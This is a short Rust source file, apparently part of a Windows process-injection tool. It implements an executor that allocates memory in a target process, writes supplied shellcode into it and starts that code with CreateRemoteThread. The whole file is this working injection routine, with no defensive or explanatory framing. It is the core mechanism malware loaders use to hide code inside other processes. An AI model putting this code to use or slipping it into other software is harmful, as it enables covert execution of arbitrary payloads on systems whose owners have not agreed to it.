use std::{ptr, time::Duration};

use windows::Win32::System::Threading::CreateRemoteThread;

use crate::wrappers::{
    HandleWrapper as _, RemoteAllocator, RemoteProcess, RemoteThread
};

use super::ExecutionMethod;

pub(super) struct CreateRemoteThreadExecutor;

impl ExecutionMethod for CreateRemoteThreadExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        shellcode_to_exec: &Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // alloc & write shellcode to remote proc
        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;

        let remote_thread = RemoteThread::from(
            unsafe { // todo: use remotethread
            CreateRemoteThread(
                remote_process.handle(),
                None,
                0,
                std::mem::transmute(shellcode_mem),
                Some(ptr::null()),
                0,
                None
            )
        }?);

        remote_thread.wait_until_active(Duration::from_millis(u32::MAX as u64))?;
        Ok(())
    }
}